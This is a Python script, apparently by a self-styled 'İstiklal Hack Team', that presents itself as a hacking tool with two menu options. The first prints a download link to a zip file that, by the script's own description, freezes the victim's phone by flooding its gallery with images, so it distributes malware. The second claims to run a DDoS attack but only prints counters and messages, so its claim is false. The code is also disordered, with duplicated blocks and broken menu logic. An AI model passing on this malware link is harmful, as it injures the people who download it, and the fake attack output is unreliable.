#!/usr/bin/python3

import os
import time
import platform
import random
import datetime
#Mor = '\033[95m'
#Cyan = '\033[96m'
#KoyuMavi = '\033[1;34m'
#Mavi = '\033[94m'
#Yeşil = '\033[92m'
#Sarı = '\033[93m'
#Pembe = '\33[95m'
#Kırmızı = '\033[91m'
#Kalın = '\033[1m'
#AltıÇizili = '\033[4m'
#Bitir = '\033[0m'
#Beyaz ='\033[1;37m'
#GriKarala = '\33[100m'
#KırmızıKarala='\033[101m'
#YeşilKarala='\33[102m'
#SarıKarala='\33[103m'
#MorKarala='\33[104m'
#PembeKarala = '\33[105m'
#CyanKarala = '\33[106m'
#BeyazKarala = '\33[107m'
print("""\033[92m
 █████          █████     ███  █████      ████                ████ 
░░███          ░░███     ░░░  ░░███      ░░███              ░░███ 
 ░███   █████  ███████   ████  ░███ █████ ░███   ██████   ░███ 
 ░███  ███░░  ░░░███░   ░░███  ░███░░███  ░███  ░░░░░███  ░███ 
 ░███ ░░█████   ░███     ░███  ░██████░   ░███   ███████  ░███ 
 ░███  ░░░░███  ░███ ███ ░███  ░███░░███  ░███  ███░░███  ░███ 
 █████ ██████   ░░█████  █████ ████ █████ █████░░████████ █████
░░░░░ ░░░░░░     ░░░░░  ░░░░░ ░░░░ ░░░░░ ░░░░░  ░░░░░░░░ ░░░░░ 
                                                               
                                                               
                                                               
 █████   █████                    █████                        
░░███   ░░███                    ░░███                         
 ░███    ░███   ██████    ██████  ░███ █████                   
 ░███████████  ░░░░░███  ███░░███ ░███░░███                    
 ░███░░░░░███   ███████ ░███ ░░░  ░██████░                     
 ░███    ░███  ███░░███ ░███  ███ ░███░░███                    
 █████   █████░░████████░░██████  ████ █████                   
░░░░░   ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                    
                                                               
                                                               
                                                               
 ███████████                                                   
░█░░░███░░░█                                                   
░   ░███  ░   ██████   ██████   █████████████                  
    ░███     ███░░███ ░░░░░███ ░░███░░███░░███                 
    ░███    ░███████   ███████  ░███ ░███ ░███                 
    ░███    ░███░░░   ███░░███  ░███ ░███ ░███                 
    █████   ░░██████ ░░████████ █████░███ █████                
   ░░░░░     ░░░░░░   ░░░░░░░░ ░░░░░ ░░░ ░░░░░     
       Created By Wostarex
          Hack Tool
           İSTİKLAL
            TEAM
           My Hack
            Tool
{1}--Virus App Link
{2}--Ddos Hücumu
""")    
Team = input("\033[1;37mİstiklal Hack Team ~#")
if(Team == "1"):
    print("""
1.Virus linki yaradın""")
select = input("\033[92mSeçim Edin:")
if(select == "1"):
    print("...")
time.sleep(2)
print("""https://dosya.co/3mh8mbcdze0l/Anonymaous_V6.zip.html
===============================================================
bu linki başqasına atdıqda və programı indirdikde qaleryasına çoxlu şəkillər düşəcək və telefon donacaq
""")
#!/usr/bin/python3
if(Team == "2"):
    import os
import time
import platform
import random
import datetime
#Mor = '\033[95m'
#Cyan = '\033[96m'
#KoyuMavi = '\033[1;34m'
#Mavi = '\033[94m'
#Yeşil = '\033[92m'
#Sarı = '\033[93m'
#Pembe = '\33[95m'
#Kırmızı = '\033[91m'
#Kalın = '\033[1m'
#AltıÇizili = '\033[4m'
#Bitir = '\033[0m'
#Beyaz ='\033[1;37m'
#GriKarala = '\33[100m'
#KırmızıKarala='\033[101m'
#YeşilKarala='\33[102m'
#SarıKarala='\33[103m'
#MorKarala='\33[104m'
#PembeKarala = '\33[105m'
#CyanKarala = '\33[106m'
#BeyazKarala = '\33[107m'
#İstiklal Team
print("""\033[93m
{------------DDOSER------------}""" + """\033[92m
       CREATED BY WOSTAREX                  
      DDOS TOOL/DDOS SYSTEM!
          FUCK SYSTEM  
           WOSTAREX                               
""" +"""\033[93m 
{------------DDOSER------------}""")
ddosurl = input("\033[95mWEBSİTE URL/İP:")
ddos = input("\033[95mPORT:")
ddos = input("\033[95mTHREADS:")
time.sleep(1)
print("\033[92mPortlar Hazırlanır!")
a = 1

while a < 100000:
    a += 1
    print(a)
try:
    while True:
        print("""\033[95m
ddos tool|ddos launched...
        portlar hazırlandı!!!
        start|ddos started!
    ip ddos start!    
        """ + ddosurl + """
        portlar hazırlandı!!!
        """)
except KeyboardInterrupt:
    print("Döngüden çıkıldı.")
#İstifade etdiyiniz üçün təşəkkürlər bu tool İSTİKLAL TEAMİN şərəfinə yazılımışdır və Wostarex kodlamışdır.